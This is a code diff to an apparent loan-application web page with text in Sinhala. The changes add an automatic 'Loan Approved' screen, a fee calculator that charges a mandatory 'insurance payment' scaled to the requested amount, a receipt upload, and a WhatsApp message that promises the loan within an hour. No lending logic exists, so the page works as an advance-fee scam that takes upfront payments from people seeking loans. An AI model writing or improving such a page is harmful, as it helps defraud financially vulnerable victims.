@@ -66,6 +66,16 @@ canvas{
     touch-action:none;
 }
 
+/* STATEMENTS */
+.statement{
+    margin-top:12px;
+    padding:12px;
+    background:#f4f6f8;
+    border-radius:12px;
+    font-size:14px;
+    line-height:1.5;
+}
+
 /* LOADING */
 #loading{
     position:fixed;
@@ -118,6 +128,10 @@ canvas{
     <label>Amount (Rs)</label>
     <input type="number" id="amount">
 
+    <div class="statement">
+        මා විසින් ලබාගන්නා මෙම මුදල, ඉහත ලේඛනයේ සඳහන් පොලී අනුපාතයන්ට එකඟව මුදල් ගෙවන බවට මෙයින් පොරොන්දු වෙමි.
+    </div>
+
     <label>Signature</label>
     <canvas id="sign"></canvas>
     <button class="clear-btn" onclick="clearSign()">Clear Signature</button>
@@ -128,6 +142,16 @@ canvas{
 <!-- PAGE 2 -->
 <div class="page" id="page2">
     <h3>Loan Approved</h3>
+
+    <p><b>Requested Amount:</b> Rs. <span id="showAmount"></span></p>
+    <p><b>Insurance Payment:</b> Rs. <span id="insurance"></span></p>
+
+    <div class="statement">
+        ඔබ ලබාගන්නා ණය මුදල අනුමත වී ඇත.<br><br>
+        එම මුදල ලබා ගැනීම සඳහා, ඉහත සඳහන් රක්ෂණ මුදල ගෙවීම අනිවාර්ය වේ.<br><br>
+        රක්ෂණ මුදල ගෙවා පැයක් ඇතුළත, අපගේ පද්ධතිය මඟින් ඔබගේ ගිණුමට මුදල් බැර කරනු ලැබේ.<br><br>
+        අප විසින් ලබාදෙන රිසිට් පත WhatsApp හරහා එවනු ලැබේ.
+    </div>
 
     <label>Upload Receipt</label>
     <input type="file" id="receipt" accept="image/*">
@@ -152,8 +176,21 @@ canvas{
 
 <script>
 /* CONFIG */
-const PAY_LINK = "https://example.com/pay";  // Change to real payment URL
-const WHATSAPP_NO = "947XXXXXXXX";          // Change to real number
+const PAY_LINK = "https://example.com/pay";
+const WHATSAPP_NO = "947XXXXXXXX";
+
+/* INSURANCE CALCULATION */
+function calculateInsurance(amount){
+    amount = parseInt(amount);
+    if(amount<=30000) return 2000;
+    if(amount<=40000) return 2500;
+    if(amount<=50000) return 3000;
+    if(amount<=100000) return 3500;
+    if(amount<=200000) return 4000;
+    if(amount<=300000) return 4000;
+    if(amount<=400000) return 5000;
+    return 5500;
+}
 
 /* SIGNATURE */
 const c = document.getElementById("sign");
@@ -176,7 +213,7 @@ c.addEventListener("pointermove", e => { if(!drawing) return; ctx.lineTo(e.offse
 c.addEventListener("pointerup", ()=>drawing=false);
 c.addEventListener("pointerleave", ()=>drawing=false);
 
-/* Touch fallback for older devices */
+/* Touch fallback */
 c.addEventListener("touchstart", e => {
     const t = e.touches[0];
     drawing = true;
@@ -204,6 +241,10 @@ function goNext(){
         return;
     }
 
+    const insurance = calculateInsurance(amount);
+    document.getElementById("showAmount").innerText = amount;
+    document.getElementById("insurance").innerText = insurance;
+
     document.getElementById("page1").style.display = "none";
     document.getElementById("loading").style.display = "flex";
 
@@ -229,14 +270,13 @@ function submitForm(){
     }
 
     const now = new Date();
-    const checkTime = new Date(now.getTime() + 10*60000); // 10 min later
-    const loanRelease = new Date(now.getTime() + 60*60000); // 1 hour later
+    const checkTime = new Date(now.getTime() + 10*60000);
+    const loanRelease = new Date(now.getTime() + 60*60000);
 
     const msg = `Receipt Uploaded ✅
 Check Time: ${checkTime.toLocaleTimeString()}
 Loan Release: ${loanRelease.toLocaleTimeString()}`;
 
-    // WhatsApp
     window.open(
         "https://wa.me/"+WHATSAPP_NO+"?text="+encodeURIComponent(msg),
         "_blank"
